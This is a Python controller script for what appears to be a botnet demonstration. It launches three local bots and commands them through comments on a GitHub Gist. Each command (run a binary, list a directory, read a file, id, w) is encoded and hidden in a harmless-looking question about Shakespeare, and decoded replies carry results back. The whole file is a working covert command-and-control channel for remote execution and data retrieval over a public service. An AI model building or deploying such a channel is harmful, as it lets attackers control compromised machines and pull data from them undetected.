from bot import Bot
import gist_utils

from threading import Thread
from apscheduler.schedulers.background import BackgroundScheduler
import socket
import os, signal, atexit


# Starting 3 bots as TCP servers running on separate threads on the localhost address.
# Each bot has a unique id represented as a human first name.

LOCALHOST = "127.0.0.1"

def startBot(bot : Bot) -> None:
    bot.start()

bots = [Bot("Peter", LOCALHOST, 6500), Bot("Martin", LOCALHOST, 6501), Bot("Lucas", LOCALHOST, 6502)]
botIds = [bot.id for bot in bots]
botThreads = [Thread(target = startBot, args=(bot,), daemon = True) for bot in bots]
for botThread in botThreads:
    botThread.start()


# Making a background scheduler which checks every 5 seconds if bots are still up 
# by connecting to their open TCP ports. It exits the program if no bots are up.

def checkIfBotUp(bot : Bot) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        if s.connect_ex((bot.host, bot.port)) != 0:
            # bot is down
            global botsAliveChecker, jobs
            botsAliveChecker.remove_job(jobs[(bot.host, bot.port)])
            if not botsAliveChecker.get_jobs():
                print("All bots down!")
                os.kill(os.getpid(), signal.SIGINT)
        # else bot is up

botsAliveChecker = BackgroundScheduler()
atexit.register(lambda : botsAliveChecker.shutdown())
jobs = {}
for bot in bots:
    job = botsAliveChecker.add_job(func = checkIfBotUp, args = (bot,), trigger = "interval", seconds = 5)
    jobs[(bot.host, bot.port)] = job.id
botsAliveChecker.start()


# supported commands

supportedCommandsParams = {} # command_name : number_of_command_parameters
supportedCommandsParams["exec"] = 1
supportedCommandsParams["id"] = 0
supportedCommandsParams["ls"] = 1
supportedCommandsParams["w"] = 0
supportedCommandsParams["file"] = 1

supportedCommandsCovers = {} # command_name : cover_message_to_hide_command_into
supportedCommandsCovers["exec"] = "{0}, could you please summarize the persona of William Shakespeare?"
supportedCommandsCovers["id"] = "{0}, what do you know about the life of William Shakespeare?"
supportedCommandsCovers["ls"] = "{0}, what can you tell us about the work of William Shakespeare?"
supportedCommandsCovers["w"] = "{0}, how did William Shakespeare die, and when was it?"
supportedCommandsCovers["file"] = "{0}, could you please tell us something about the late work of William Shakespeare?"


# Creating a new gist and setting up listeners to check every 5 seconds for 
# new comments in the gist for both the controller and each individual bot.

GIST_URL = gist_utils.createGist()
print(GIST_URL)

def checkNewGistComments(gistUrl : str) -> None:
    global controllerTurn
    if controllerTurn:
        return
    lastComment = gist_utils.fetchLastComment(gistUrl)
    if lastComment:
        secret = gist_utils.decodeMessage(lastComment["body"])
        if secret.startswith("bot:"):
            print(secret[5:])
            controllerTurn = True

newCommentsListener = BackgroundScheduler()
atexit.register(lambda : newCommentsListener.shutdown())
newCommentsListener.add_job(func = checkNewGistComments, args = (GIST_URL,), trigger = "interval", seconds = 5)
newCommentsListener.start()

for bot in bots:
    bot.startNewCommentsListener(GIST_URL)


# Infinite loop with user input for sending commands to active bots (turn-based communication)

controllerTurn = True
try:
    while True:
        if not controllerTurn:
            continue

        cmd = input()
        if cmd == "exit":
            break

        cmdSplit = cmd.split()
        if not cmdSplit or (cmdSplit[0], len(cmdSplit)-2) not in supportedCommandsParams.items() or cmdSplit[-1] not in botIds:
            print(f"Invalid command: {cmd}")
            print("Supported commands: w <bot_id>, ls <dir> <bot_id>, id <bot_id>, file <file_path> <bot_id>, exec <binary_file_path> <bot_id>")
            print(f"Available bot ids: {botIds}")
        else:
            gist_utils.addComment(GIST_URL, gist_utils.encodeMessage(supportedCommandsCovers[cmdSplit[0]].format(cmdSplit[-1]), f"controller: {cmd}"))
            controllerTurn = False
except KeyboardInterrupt:
    pass
finally:
    print("Ending communication with bots!")